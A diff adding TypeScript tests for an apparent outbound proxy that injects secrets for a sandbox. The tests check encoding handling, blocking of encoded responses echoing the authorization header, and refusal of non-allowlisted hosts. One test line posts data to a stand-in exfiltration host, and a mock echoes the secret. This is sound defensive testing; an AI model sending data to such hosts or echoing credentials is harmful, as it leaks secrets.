@@ -50,6 +50,35 @@ const send = (scope: CompanyScope, url: string, d: OutboundDeps, init?: RequestI
   handleOutbound(new Request(url, init), scope, d);
 
 describe("outbound handler", () => {
+  it("asks for an uncompressed, whole response when it adds a secret", async () => {
+    const { d, seen } = deps();
+    await send(A, "https://api.github.com/user", d, {
+      headers: { "accept-encoding": "deflate, zstd", range: "bytes=0-9" },
+    });
+    expect(seen[0]?.headers.get("accept-encoding")).toBe("identity");
+    expect(seen[0]?.headers.get("range")).toBeNull();
+  });
+
+  it("refuses an encoded echo it cannot scan, so the secret never reaches the sandbox", async () => {
+    for (const encoding of ["deflate", "zstd", "compress", "x-custom"]) {
+      const upstream = vi.fn(
+        async (request: Request) =>
+          new Response(`echo ${request.headers.get("authorization")}`, { headers: { "content-encoding": encoding } }),
+      );
+      const { d } = deps({ upstream });
+      const response = await send(A, "https://api.github.com/user", d);
+      expect(response.status, encoding).toBe(502);
+      expect(await response.text(), encoding).not.toContain(SECRET_A);
+    }
+  });
+
+  it("leaves encodings alone when it adds no secret", async () => {
+    const upstream = vi.fn(async () => new Response("packed", { headers: { "content-encoding": "zstd" } }));
+    const { d } = deps({ upstream });
+    const response = await send(A, "https://registry.npmjs.org/zod", d, { headers: { "accept-encoding": "zstd" } });
+    expect(response.status).toBe(200);
+  });
+
   it("refuses a host that is not on the company's allowlist", async () => {
     const { d, upstream, logs } = deps();
     const response = await send(A, "https://exfil.example.net/upload", d, { method: "POST", body: "data" });
